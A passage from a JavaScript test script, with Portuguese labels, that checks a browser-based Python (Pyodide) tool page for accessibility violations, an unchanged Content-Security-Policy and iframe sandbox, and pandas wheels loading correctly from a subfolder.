        await x.pg.evaluate(AXE); const r = await x.pg.evaluate(async () => { const a = await axe.run(document, { runOnly: { type: 'tag', values: ['wcag2a', 'wcag2aa', 'wcag21a', 'wcag21aa', 'wcag22aa', 'best-practice'] } }); return a.violations.map(v => v.id + ':' + v.impact + ':' + v.nodes.length); });
        const sw = await x.pg.evaluate(() => document.documentElement.scrollWidth - window.innerWidth); n++;
        if (r.length || sw > 0) bad.push(`${lang}/${theme}/${vp}/${st}: ${JSON.stringify(r)} rolagem horizontal=${sw}`);
        if (st === 'baixando') { await x.pg.click('#pyStop'); opts.wheelDelayMs = 0; }
        await x.c.close();
      }
    }
    L.rec(`PD-14/A11-02 axe-core: zero violacoes (qualquer impacto) e sem rolagem horizontal em ${n} estados (inicial, exemplo carregado, apos pandas, baixando pacotes, modulo ausente, erro; EN/PT; claro/escuro; 360 e 1280 px)`, bad.length === 0 && n === 48, bad.join('\n') || `${n} estados`);
    { const { c, pg } = await open(br, SITE, 'en', 'light', 360); const r = await pg.evaluate(() => { const b = document.getElementById('pyExample').getBoundingClientRect(); return { w: b.width, h: b.height, right: b.right, vw: window.innerWidth }; });
      L.rec('PD-14 360 px: botao do exemplo cabe na tela e tem alvo de toque >= 24 px de altura', r.right <= r.vw && r.h >= 24, JSON.stringify(r)); await c.close(); }
  }

  // ===== PD-15: CSP/sandbox inalterados; origem unica; subpasta =====
  if (want('PD-15')) {
    const runner = fs.readFileSync(`${L.REPO}/hub/ferramentas/python/runner.html`, 'utf8'), page = fs.readFileSync(`${L.REPO}/hub/ferramentas/python/index.html`, 'utf8');
    const rc = /<meta http-equiv="Content-Security-Policy" content="([^"]+)"/.exec(runner)[1], pc = /<meta http-equiv="Content-Security-Policy" content="([^"]+)"/.exec(page)[1];
    L.rec('PD-15 CSP do runner.html IDENTICA a da D10/D11 (default-src none; script-src self wasm-unsafe-eval; connect-src self; worker-src data:; base-uri none; form-action none; object-src none) e da pagina (inalterada): pandas nao exigiu mudar a CSP',
      rc === "default-src 'none'; script-src 'self' 'wasm-unsafe-eval'; connect-src 'self'; worker-src data:; base-uri 'none'; form-action 'none'; object-src 'none'" && pc === "default-src 'none'; script-src 'self'; style-src 'self'; img-src 'self' data:; font-src 'self'; connect-src 'self'; frame-src 'self'; base-uri 'none'; form-action 'none'; object-src 'none'", rc + ' || ' + pc);
    L.rec('PD-15 sandbox do iframe inalterado ("allow-scripts", sem allow-same-origin) no codigo da pagina', /setAttribute\('sandbox', 'allow-scripts'\)/.test(fs.readFileSync(`${L.REPO}/hub/assets/js/python.js`, 'utf8')) && !/allow-same-origin['"]/.test(fs.readFileSync(`${L.REPO}/hub/assets/js/python.js`, 'utf8').replace(/NUNCA allow-same-origin/g, '')), 'ok');
    const { c, pg, log } = await open(br, `${SITE}/portfolio`, 'en', 'light'); const s0 = served.length;
    await run(pg, 'import pandas as pd\nprint(pd.read_csv("/data/pedidos.csv").shape)'); const g = await grab(pg);
    L.rec('PD-15 subpasta /portfolio/ (como Pages de projeto): pandas carrega os 5 wheels de /portfolio/hub/assets/vendor/pyodide/packages/ e le o CSV', g.out === '(200, 5)\n' && served.slice(s0).filter(isWheel).length === 5 && served.slice(s0).filter(isWheel).every(u => u.startsWith('/portfolio/hub/assets/vendor/pyodide/packages/')), `${JSON.stringify(g.out)} ${served.slice(s0).filter(isWheel).length} wheels`);
    // sem CORS nos wheels: falha limpa
    await c.close();
  }
  await finish();
})();
